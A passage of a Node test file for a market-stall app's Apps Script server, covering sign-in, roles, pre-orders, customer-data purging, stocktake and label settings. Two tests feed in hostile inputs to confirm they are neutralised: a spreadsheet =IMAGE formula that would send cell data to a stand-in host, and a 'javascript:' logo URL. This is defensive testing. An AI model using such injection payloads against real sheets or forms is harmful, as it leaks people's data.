/**
 * Runs the real server/*.gs files in Node against an in-memory spreadsheet,
 * with Google's services replaced by small fakes. No network, no Google.
 *
 *   node tests/server.test.js
 *
 * Covers sign-in and permissions, the part where a mistake locks people out
 * or lets the wrong person in.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

/* ---------- fakes for the Apps Script services ---------- */

function makeSheet() {
  const rows = [];
  const sheet = {
    rows,
    appendRow(r) { rows.push(r.slice()); },
    getLastRow() { return rows.length; },
    getLastColumn() { return rows.reduce((m, r) => Math.max(m, r.length), 0); },
    getRange(r, c, nr, nc) {
      nr = nr || 1; nc = nc || 1;
      return {
        getValues() {
          const out = [];
          for (let i = 0; i < nr; i++) {
            const row = rows[r - 1 + i] || [];
            const o = [];
            for (let j = 0; j < nc; j++) {
              const v = row[c - 1 + j] === undefined ? '' : row[c - 1 + j];
              // Like Sheets: a leading apostrophe only marks text; reading gives the text without it.
              o.push(typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v);
            }
            out.push(o);
          }
          return out;
        },
        getValue() { return this.getValues()[0][0]; },
        setValue(v) { (rows[r - 1] = rows[r - 1] || [])[c - 1] = v; return this; },
        setValues(vs) {
          vs.forEach((row, i) => row.forEach((v, j) => {
            (rows[r - 1 + i] = rows[r - 1 + i] || [])[c - 1 + j] = v;
          }));
          return this;
        },
        setFontWeight() { return this; }, setBackground() { return this; },
        setFontColor() { return this; }
      };
    },
    deleteRow(n) { rows.splice(n - 1, 1); },
    deleteRows(n, k) { rows.splice(n - 1, k); },
    setFrozenRows() {}
  };
  return sheet;
}

function load(googleTokens) {
  const sheets = {};
  const props = {};
  const ctx = {
    console, __gh: [],
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = makeSheet())
      }),
      getUi: () => ({ alert() {} 
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; }
      })
    },
    Utilities: {
      getUuid: () => crypto.randomUUID(),
      computeHmacSha256Signature: (v, key) =>
        Array.from(crypto.createHmac('sha256', key).update(v).digest()).map((b) => (b > 127 ? b - 256 : b)),
      formatDate: (d, tz, f) => (f === 'yyyy-MM-dd' ? d.toISOString().slice(0, 10) : d.toISOString())
    },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    UrlFetchApp: {
      fetch: (url, opts) => {
        if (url.indexOf('api.github.com') !== -1 && opts && opts.method === 'get') {
          const good = /good/.test(opts.headers.Authorization);
          return { getResponseCode: () => (good ? 200 : 401), getContentText: () => '{}' };
        }
        if (url.indexOf('api.github.com') !== -1) {
          ctx.__gh.push({ url, opts });
          return { getResponseCode: () => 201,
                   getContentText: () => JSON.stringify({ html_url: 'https://github.com/o/r/issues/7' }) };
        }
        const tok = decodeURIComponent(url.split('id_token=')[1]);
        const info = googleTokens[tok];
        return {
          getResponseCode: () => (info ? 200 : 400),
          getContentText: () => JSON.stringify(info || { error: 'invalid_token' })
        };
      }
    },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example/exec' }) },
    ContentService: {}, HtmlService: {}
  };
  vm.createContext(ctx);
  // Start every test from "Google off", whatever Platform.gs currently holds.
  const dir = path.join(__dirname, '..', 'server');
  fs.readdirSync(dir).filter((f) => f.endsWith('.gs')).sort().forEach((f) => {
    vm.runInContext(fs.readFileSync(path.join(dir, f), 'utf8'), ctx, { filename: f });
  });
  ctx.SF.PLATFORM.googleClientId = '';
  ctx.SF.PLATFORM.admins = [];
  ctx.SF.migrate();
  return { SF: ctx.SF, sheets, props, gh: ctx.__gh, ctx };
}

const CLIENT = 'client-123.apps.googleusercontent.com';
const future = String(Math.floor(Date.now() / 1000) + 3600);
function idToken(email, extra) {
  return Object.assign({ aud: CLIENT, iss: 'https://accounts.google.com',
                         email, email_verified: 'true', exp: future, name: 'Test' }, extra || {});
}
const TOKENS = {
  admin: idToken('Boss@StallFlow.co.za'),
  helper: idToken('helper@gmail.com'),
  stranger: idToken('stranger@gmail.com'),
  wrongAud: idToken('helper@gmail.com', { aud: 'someone-else' }),
  unverified: idToken('helper@gmail.com', { email_verified: 'false' })
};

let failures = 0;
function test(name, fn) {
  try { fn(); console.log('ok   ' + name); }
  catch (e) { failures++; console.log('FAIL ' + name + '\n     ' + e.message); }
}
const signIn = (SF, credential) => SF.dispatch('signInGoogle', { credential, device: 'd1' }).data;

/* ---------- PIN mode, before Google is switched on ---------- */

test('without a client ID, PIN sign-in still works', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  const r = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data;
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(SF.dispatch('health', { token: r.token }).ok, true);
});

test('without a client ID, Google sign-in is refused', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(signIn(SF, 'admin').ok, false);
});

test('a client ID with no admins leaves PINs on, so nobody is locked out', () => {
  const { SF } = load(TOKENS);
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = [];
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, true);
});

/* ---------- Google mode ---------- */

function google() {
  const env = load(TOKENS);
  env.SF.PLATFORM.googleClientId = CLIENT;
  env.SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  return env;
}

test('a platform admin signs in as owner, whatever the case of the email', () => {
  const { SF } = google();
  const r = signIn(SF, 'admin');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(r.user, 'boss@stallflow.co.za');
});

test('someone not on the list is turned away with a clear message', () => {
  const { SF } = google();
  const r = signIn(SF, 'stranger');
  assert.strictEqual(r.ok, false);
  assert.ok(/not been added/.test(r.message));
});

test('a token for another app, or an unverified email, is refused', () => {
  const { SF } = google();
  SF.append('users', { Email: 'helper@gmail.com', Role: 'cashier', Active: 'Yes' });
  assert.strictEqual(signIn(SF, 'wrongAud').ok, false);
  assert.strictEqual(signIn(SF, 'unverified').ok, false);
  assert.strictEqual(signIn(SF, 'nonsense').ok, false);
});

test('PINs stop working once Google is on', () => {
  const { SF } = load(TOKENS);
  SF.setPin('owner', '4321');
  const pinToken = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.token;
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, false);
  assert.strictEqual(SF.dispatch('signIn', { pin: '', device: 'd1' }).data.ok, false,
    'a blank PIN must not give owner access any more');
  assert.strictEqual(SF.dispatch('health', { token: pinToken }).code, 'auth');
});

test('the owner adds a cashier, who can sell but not see People', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const add = SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'Helper@Gmail.com',
                                           role: 'cashier' });
  assert.strictEqual(add.ok, true);
  const helper = signIn(SF, 'helper');
  assert.strictEqual(helper.ok, true);
  assert.strictEqual(helper.role, 'cashier');
  assert.strictEqual(SF.dispatch('till', { token: helper.token }).ok, true);
  assert.strictEqual(SF.dispatch('people', { token: helper.token }).code, 'forbidden');
});

test('promoting someone works on their next tap, without signing in again', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('people', { token: helper }).code, 'forbidden');
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  assert.strictEqual(SF.dispatch('people', { token: helper }).ok, true);
});

test('switching someone off locks them out straight away', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'manager' });
  const helper = signIn(SF, 'helper').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'manager',
                              active: false });
  assert.strictEqual(SF.dispatch('till', { token: helper }).code, 'auth');
  assert.strictEqual(signIn(SF, 'helper').ok, false);
});

test('a platform admin cannot be demoted, and nobody can change their own access', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: owner, opId: 'a1',
    email: 'boss@stallflow.co.za', role: 'viewer' }).ok, false);
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: helper, opId: 'a3',
    email: 'helper@gmail.com', role: 'viewer' }).ok, false);
});

test('a forged or edited token is refused', () => {
  const { SF } = google();
  const t = signIn(SF, 'admin').token.split('|');
  t[3] = 'helper@gmail.com';
  assert.strictEqual(SF.dispatch('health', { token: t.join('|') }).code, 'auth');
});

test('the audit trail names the person, not just the role', () => {
  const { SF, sheets } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const actors = sheets.Audit.rows.slice(1).map((r) => r[1]);
  assert.ok(actors.indexOf('boss@stallflow.co.za') !== -1, actors.join(', '));
});

test('boot tells the app who is signed in and that Google is on', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const b = SF.dispatch('boot', { token: owner }).data;
  assert.strictEqual(b.me.user, 'boss@stallflow.co.za');
  assert.strictEqual(b.auth.google, true);
});

/* ---------- orders from the public page ---------- */

function shop(marketDate) {
  const env = load(TOKENS);
  const SF = env.SF;
  SF.append('products', { ProductId: 'P01', Name: 'Apricot Jam', Type: 'stocked', Unit: 'each',
                          Price: 70, Active: 'Yes', Sort: 10 });
  SF.move('P01', 10, 'adjust', 'test');
  SF.append('markets', { MarketId: 'M01', Name: 'Test Market', Date: marketDate, Status: 'planned' });
  SF.set('activeMarket', 'M01');
  return env;
}
const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
let op = 0;
const order = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
  opId: 'o' + (op++), name: 'Anna', phone: '082 123 4567', consent: true,
  lines: [{ id: 'P01', qty: 1 }] }, extra || {}));

test('a formula typed as a name is stored as plain text', () => {
  const { SF, sheets } = shop(day(3));
  assert.strictEqual(order(SF, { name: '=IMAGE("https://x.example/?"&D2)', note: '+1 more' }).ok, true);
  const row = sheets.Orders.rows[1];
  assert.ok(String(row[4]).startsWith("'="), 'name: ' + row[4]);
  assert.ok(String(row[13]).startsWith("'+"), 'note: ' + row[13]);
});

test('one phone number can hold at most 2 unpaid orders per market', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(order(SF).ok, true);
  assert.strictEqual(order(SF, { phone: '0821234567' }).ok, true);
  const third = order(SF, { phone: '+27 82 123 4567'.replace('+27 ', '0') });
  assert.strictEqual(third.ok, false);
  assert.ok(/already has 2/.test(third.message));
  assert.strictEqual(order(SF, { phone: '083 999 0000' }).ok, true, 'someone else can still order');
});

test('pre-orders close by themselves once the market date has passed', () => {
  const { SF } = shop(day(-1));
  assert.strictEqual(SF.preordersOpen(), false);
  assert.strictEqual(order(SF).ok, false);
  assert.strictEqual(SF.dispatch('catalogue', {}).data.open, false);
});

test('pre-orders stay open on the day of the market', () => {
  const { SF } = shop(day(0));
  assert.strictEqual(order(SF).ok, true);
});

test('releasing unpaid reservations puts the stock back', () => {
  const { SF } = shop(day(3));
  order(SF); order(SF, { phone: '083 999 0000' });
  assert.strictEqual(SF.onHand().P01, 8);
  SF.setPin('owner', '4321');
  const t = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('releaseUnpaid', { token: t, opId: 'r1' });
  assert.strictEqual(r.released, 2);
  assert.strictEqual(SF.onHand().P01, 10);
});

test('customer details are wiped once their market is over, and only then', () => {
  const { SF, sheets } = shop(day(3));
  order(SF, { note: 'gate 2' });
  SF.purgeCustomers();
  assert.strictEqual(String(sheets.Orders.rows[1][4]), 'Anna', 'live market keeps its customers');
  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(10), Status: 'planned' });
  SF.set('activeMarket', 'M02');
  assert.strictEqual(SF.purgeCustomers(), 0, 'a future market is not over yet');
  SF.setCell('markets', 2, 'Date', day(-1));
  assert.strictEqual(SF.purgeCustomers(), 1);
  const row = sheets.Orders.rows[1];
  assert.deepStrictEqual([row[4], row[5], row[13]], ['Customer', '', '']);
  assert.strictEqual(row[8], 70, 'the money stays');
});

test('the Duxies stocktake loads prices and counts, and running it twice changes nothing', () => {
  const { SF } = shop(day(3));
  const ctx = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  // Stocktake.gs only needs SF, so run it in a small context that shares it.
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(
    fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), ctx));
  SF.pots = () => ctx.sfPots();
  SF.newPot = (n) => ctx.sfNewPot(n);   // in Apps Script every file shares one global scope
  const first = ctx.sfApplyStocktake();
  assert.strictEqual(first.off, 1, 'the old placeholder jam is switched off');
  assert.strictEqual(SF.onHand().P01, 0, 'and its jars no longer count');
  const ps = SF.products();
  const find = (n, v) => ps.find((p) => p.name === n && p.variant === v);
  assert.strictEqual(find('Strawberry', '125 ml').onHand, 17);
  assert.strictEqual(find('Strawberry', '352 ml').price, 70);
  assert.strictEqual(find('Fig', '125 ml').price, 50);
  assert.strictEqual(find('Orange Marmalade Whiskey', 'Medium (odd bottle)').price, 60);
  assert.strictEqual(find('Butter Biscuits', '300 g pack').type, 'made');
  assert.strictEqual(first.jars, 225);
  const big = find('Strawberry', '352 ml').cost, small = find('Strawberry', '125 ml').cost;
  assert.ok(big > 30 && big < 40, 'a big strawberry jar costs about R34, got ' + big);
  assert.ok(small > 7.8 && small < big, 'a small jar costs its bottle and less fruit');
  assert.ok(find('Butter Biscuits', '300 g pack').cost > 20);
  assert.strictEqual(find('Crunchies', '300 g pack').cost, 0, 'no recipe, no guess');
  assert.strictEqual(find('Strawberry', '352 ml').onHand, 14, 'a bottle cost adds no stock');
  const again = ctx.sfApplyStocktake();
  assert.deepStrictEqual([again.added, again.moved], [0, 0]);
  assert.strictEqual(find('Strawberry', '352 ml').cost, SF.products().find((p) => p.name === 'Strawberry' && p.variant === '352 ml').cost);
  assert.strictEqual(SF.rows('batches').length, again.costed, 'running it again updates, never duplicates');

  // Cooking a pot: pre-filled recipe, jars on the shelf, cupboard goes down.
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'c1', item: 'Strawberries', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'c2', item: 'Sugar', qty: 2000, unit: 'g' });
  SF.dispatch('savePantry', { token: tok, opId: 'c3', item: '352 ml bottles', qty: 10, unit: 'each' });
  const st = SF.dispatch('stock', { token: tok }).data;
  const pot = st.pots.find((x) => x.name === 'Strawberry');
  assert.strictEqual(st.pantry.some((r) => r.item === 'Odd bottles'), true, 'the cupboard lists what pots use');
  const bigId = pot.sizes.find((x) => x.variant === '352 ml').productId;
  const smallId = pot.sizes.find((x) => x.variant === '125 ml').productId;
  const before = SF.onHand()[bigId];
  const res = SF.dispatch('cookPot', { token: tok, opId: 'c4', name: 'Strawberry', lines: pot.lines,
                                       jars: { [bigId]: 5, [smallId]: 3 } });
  assert.strictEqual(res.ok, true, res.message);
  assert.strictEqual(SF.onHand()[bigId], before + 5);
  const left = Object.fromEntries(SF.pantry().map((r) => [r.item, r.qty]));
  assert.deepStrictEqual([left.Strawberries, left.Sugar, left['352 ml bottles']], [2, 0, 5]);
  // Changing the usual recipe, and starting a new jam.
  const lines2 = pot.lines.concat([{ label: 'Lemon juice', qty: 1, unit: 'pot', price: 5 }]);
  assert.strictEqual(SF.dispatch('saveRecipe', { token: tok, opId: 'r1', name: 'Strawberry',
                                                 makes: 6, lines: lines2 }).ok, true);
  const pot2 = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Strawberry');
  assert.ok(pot2.lines.some((l) => l.label === 'Lemon juice'), 'the saved recipe is used');
  const nu = SF.dispatch('saveRecipe', { token: tok, opId: 'r2', name: 'Quince', makes: 6,
                                         lines: [{ label: 'Quinces', qty: 3, unit: 'kg', price: 20 }] });
  assert.strictEqual(nu.isNew, true);
  const q = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Quince');
  assert.strictEqual(q.sizes.length, 2, 'a new jam gets its sizes on the shelf list');
  assert.strictEqual(SF.dispatch('cookPot', { token: tok, opId: 'c5', name: 'Strawberry',
                                              lines: pot.lines, jars: {} }).ok, false);
});

test('a sale between markets is kept apart from the live market', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 's1', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 's2', where: 'home', lines: [{ id: 'P01', qty: 2 }] });
  const at = SF.dispatch('dashboard', { token: tok, marketId: 'M01' }).data;
  const home = SF.dispatch('dashboard', { token: tok, marketId: 'HOME' }).data;
  assert.ok(at.markets.some((m) => m.id === 'HOME'), 'Numbers can pick it');
  assert.strictEqual(SF.onHand().P01, 7, 'both sales come off the shelf');
  const total = (d) => JSON.stringify(d).match(/"revenue":(\d+)/)[1];
  assert.strictEqual(total(at), '70');
  assert.strictEqual(total(home), '140');
});

test('two markets on the same day keep their own sales', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'RNW', Date: day(3), Status: 'planned' });
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 'a', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 'b', marketId: 'M02', lines: [{ id: 'P01', qty: 2 }] });
  SF.dispatch('sell', { token: tok, opId: 'c', marketId: 'nonsense', lines: [{ id: 'P01', qty: 1 }] });
  const t1 = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  const t2 = SF.dispatch('till', { token: tok, marketId: 'M02' }).data;
  assert.strictEqual(t1.totals.tillTotal, 140, 'an unknown market falls back to the live one');
  assert.strictEqual(t2.totals.tillTotal, 140);
  assert.ok(t1.markets.some((m) => m.id === 'M02') && t1.markets.some((m) => m.id === 'HOME'));
});

test('uncooked stock is a list she can add to and update', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'p1', item: 'Sugar', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p2', item: 'sugar', qty: 2.5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p3', item: '352 ml bottles', qty: 24, unit: 'each' });
  const p = SF.dispatch('stock', { token: tok }).data.pantry;
  assert.strictEqual(JSON.stringify(p.map((r) => [r.item, r.qty])), '[["352 ml bottles",24],["Sugar",2.5]]');
  assert.strictEqual(SF.dispatch('savePantry', { token: tok, opId: 'p4', item: 'x', qty: 1 }).ok, false);
});

/* ---------- an order page for every market, and one between markets ---------- */

function markets3() {
  const env = shop(day(3));                       // M01, live, in three days
  env.SF.append('markets', { MarketId: 'M02', Name: 'Monument Primary', Date: day(10), Status: 'planned' });
  env.SF.append('markets', { MarketId: 'M03', Name: 'Last Month', Date: day(-20), Status: 'planned' });
  env.SF.setPin('owner', '4321');
  env.tok = env.SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  return env;
}
const cat = (SF, market) => SF.dispatch('catalogue', market === undefined ? {} : { market }).data;

test('each market has its own order page, and past ones are closed', () => {
  const { SF } = markets3();
  assert.strictEqual(cat(SF).market.id, 'M01', 'no ?m= is the live market');
  assert.strictEqual(cat(SF).open, true);
  assert.strictEqual(cat(SF, 'M02').market.name, 'Monument Primary');
  assert.strictEqual(cat(SF, 'M02').open, true);
  assert.strictEqual(cat(SF, 'M03').open, false);
  assert.strictEqual(cat(SF, 'nonsense').open, false);
  assert.strictEqual(cat(SF, 'nonsense').market, null);
  assert.strictEqual(JSON.stringify(cat(SF).markets.map((m) => m.id)), '["M01","M02","home"]',
                     'soonest first, past ones left out, between markets last');
});

test('an order from a market page belongs to that market and shows in its queue', () => {
  const { SF, sheets, tok } = markets3();
  const r = order(SF, { market: 'M02' });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.market.name, 'Monument Primary');
  const row = sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  assert.strictEqual(row[2], 'M02');
  const here = SF.dispatch('queue', { token: tok, marketId: 'M02' }).data;
  const live = SF.dispatch('queue', { token: tok }).data;
  assert.ok(here.unpaid.some((o) => o.no === r.orderNo), 'in the M02 queue');
  assert.ok(!live.unpaid.some((o) => o.no === r.orderNo), 'not in the live market queue');
  assert.ok(SF.dispatch('till', { token: tok, marketId: 'M02' }).data.unpaid.some((o) => o.no === r.orderNo));
});

test('a past market refuses orders while the others still take them', () => {
  const { SF } = markets3();
  const refused = order(SF, { market: 'M03' });
  assert.strictEqual(refused.ok, false);
  assert.strictEqual(refused.code, 'closed');
  assert.strictEqual(order(SF, { market: 'M02' }).ok, true);
});

test('orders between markets are always open, and can be switched off', () => {
  const { SF, sheets, tok } = markets3();
  const home = cat(SF, 'home');
  assert.strictEqual(home.open, true);
  assert.strictEqual(home.market.home, true);
  assert.ok(/collected/.test(home.consentText), home.consentText);
  const r = order(SF, { market: 'home' });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[2], 'HOME');
  assert.ok(SF.dispatch('queue', { token: tok, marketId: 'home' }).data.unpaid.some((o) => o.no === r.orderNo));
  SF.dispatch('setHomeOrders', { token: tok, opId: 'h0', open: false });
  assert.strictEqual(cat(SF, 'home').open, false);
  assert.strictEqual(order(SF, { market: 'home' }).ok, false);
  assert.ok(!cat(SF).markets.some((m) => m.id === 'home'));
});

test('switching pre-orders off closes every market page', () => {
  const { SF, tok } = markets3();
  SF.dispatch('setPreordersOpen', { token: tok, opId: 'p0', open: false });
  ['M01', 'M02', 'home'].forEach((m) => assert.strictEqual(cat(SF, m).open, false, m));
  assert.strictEqual(cat(SF).markets.length, 0);
});

test('a between-markets customer keeps their details until the order is handed over', () => {
  const { SF, sheets, tok } = markets3();
  const r = order(SF, { market: 'home', name: 'Thabo Nkosi' });
  const row = () => sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  SF.purgeCustomers();
  assert.strictEqual(row()[4], 'Thabo Nkosi', 'still waiting, so the name stays');
  SF.dispatch('markPaid', { token: tok, opId: 'mp', orderNo: r.orderNo });
  SF.dispatch('markCollected', { token: tok, opId: 'mc', orderNo: r.orderNo });
  SF.purgeCustomers();
  assert.strictEqual(row()[4], 'Customer', 'handed over, so the name goes');
  assert.strictEqual(row()[5], '');
});

test('made-to-order capacity is counted per market', () => {
  const { SF, tok } = markets3();
  SF.append('products', { ProductId: 'P09', Name: 'Coffee', Type: 'made', Unit: 'each', Price: 30,
                          Capacity: 2, Active: 'Yes', Sort: 90 });
  assert.strictEqual(order(SF, { market: 'M01', lines: [{ id: 'P09', qty: 2 }] }).ok, true);
  const avail = (m) => cat(SF, m).products.find((p) => p.id === 'P09').available;
  assert.strictEqual(avail('M01'), 0);
  assert.strictEqual(avail('M02'), 2, 'another market has its own capacity');
  assert.strictEqual(SF.dispatch('till', { token: tok, marketId: 'M02' }).data.products
    .find((p) => p.id === 'P09').available, 2);
});

test('stock taken by an order is recorded against the market it is for', () => {
  const { SF, sheets } = markets3();
  const r = order(SF, { market: 'M02' });
  const mv = sheets.Movements.rows.find((x) => x[4] === r.orderNo);
  assert.strictEqual(mv[5], 'M02');
});

/* ---------- paying is handing over, unless the stall has a Collect step ---------- */

test('without a Collect step, Paid at the till also hands the order over', () => {
  const { SF, sheets, tok } = markets3();
  assert.strictEqual(SF.dispatch('boot', { token: tok }).data.collect, false, 'off by default');
  const r = order(SF, { market: 'M01' });
  const res = SF.dispatch('markPaid', { token: tok, opId: 'pay1', orderNo: r.orderNo });
  assert.strictEqual(res.handedOver, true);
  const row = sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  assert.strictEqual(row[10], 'collected');
  assert.ok(row[11] && row[11].getTime && row[12] && row[12].getTime, 'paid and collected times are set');
  assert.strictEqual(SF.dispatch('till', { token: tok, marketId: 'M01' }).data.unpaid.length, 0);
});

test('with the Collect step switched on, Paid waits for the hand-over', () => {
  const { SF, sheets, tok } = markets3();
  SF.dispatch('setCollectStep', { token: tok, opId: 'cs', on: true });
  assert.strictEqual(SF.dispatch('boot', { token: tok }).data.collect, true);
  const r = order(SF, { market: 'M01' });
  SF.dispatch('markPaid', { token: tok, opId: 'pay2', orderNo: r.orderNo });
  assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[10], 'paid');
  const till = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  assert.ok(till.waiting.some((o) => o.no === r.orderNo), 'the till can see it is waiting');
});

/* ---------- the label look ---------- */

test('the order page knows the owner name and WhatsApp number, and the reply carries the note', () => {
  const { SF, tok } = markets3();
  SF.dispatch('saveProfile', { token: tok, opId: 'pf', ownerName: 'Marian', whatsapp: '066 000 0000' });
  const prof = SF.dispatch('catalogue', {}).data.profile;
  assert.strictEqual(prof.ownerName, 'Marian');
  assert.strictEqual(prof.whatsapp, '066 000 0000');
  const r = order(SF, { market: 'M01', note: 'After 11 please' });
  assert.strictEqual(r.note, 'After 11 please');
});

test('the label look is kept: style, contact lines, a small logo, price on or off', () => {
  const { SF, tok } = markets3();
  let look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.style, 'classic', 'starts in the style of the printed labels');
  assert.strictEqual(look.price, false, 'no price on the label unless asked');
  const logo = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGNgAAAAAgABSK+kcQAAAABJRU5ErkJggg==';
  const r = SF.dispatch('saveLabelLook', { token: tok, opId: 'll1', style: 'classic',
    contact: 'Marian\r\nMobile 066 000 0000\nthird\nfourth line is dropped', logo, price: true });
  assert.strictEqual(r.ok, true, r.message);
  look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.contact, 'Marian\nMobile 066 000 0000\nthird');
  assert.strictEqual(look.logo, logo);
  assert.strictEqual(look.price, true);
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll2', logo: 'javascript:alert(1)' }).ok, false);
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll3',
    logo: 'data:image/png;base64,' + 'A'.repeat(70000) }).ok, false, 'too big to keep');
  SF.dispatch('saveLabelLook', { token: tok, opId: 'll4', style: 'simple', contact: '', price: false });
  look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.style, 'simple');
  assert.strictEqual(look.logo, logo, 'leaving the logo out keeps it');
});

test('only an owner or manager can change the label look', () => {
  const { SF } = markets3();
  SF.setPin('cashier', '1111');
  const t = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: t, opId: 'x', contact: 'hi' }).ok, false);
});

/* ---------- stocktake ---------- */

function counting() {
  const env = markets3();                         // owner signed in; P01 Apricot Jam, 10 on hand
  const SF = env.SF;
  SF.append('products', { ProductId: 'P02', Name: 'Fig Jam', Type: 'stocked', Unit: 'each', Price: 80, Active: 'Yes', Sort: 20 });
  SF.move('P02', 6, 'adjust', 'test');
  SF.append('batches', { BatchId: 'B1', When: new Date(), ProductId: 'P01', Made: 10, CostLines: '[]', TotalCost: 200, CostPerUnit: 20 });
  SF.setPin('cashier', '1111'); SF.setPin('manager', '2222');
  env.cashier = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  env.manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
  return env;
}
let cop = 0;
const act = (SF, action, token, extra) => SF.dispatch(action, Object.assign({ token, opId: 'k' + (cop++) }, extra || {}));

test('stocktake: a manager starts it, a cashier cannot', () => {
  const { SF, cashier, manager } = counting();
  assert.strictEqual(act(SF, 'countStart', cashier).ok, false);
  const r = act(SF, 'countStart', manager);
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(act(SF, 'countStart', manager).ok, false, 'only one at a time');
  const st = SF.dispatch('countState', { token: cashier }).data;
  assert.strictEqual(st.open.id, r.id);
  assert.strictEqual(st.canApprove, false);
  assert.strictEqual(st.open.review, undefined, 'only the owner sees the review');
  assert.strictEqual(JSON.stringify(st.open.locations.map((l) => l.status)), '["todo","todo","todo"]');
});

test('stocktake: anyone counts a location; counting it again replaces the first count', () => {
  const { SF, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countClaim', cashier, { countId: id, location: 'Storeroom' });
  let loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
  assert.strictEqual(loc.status, 'counting');
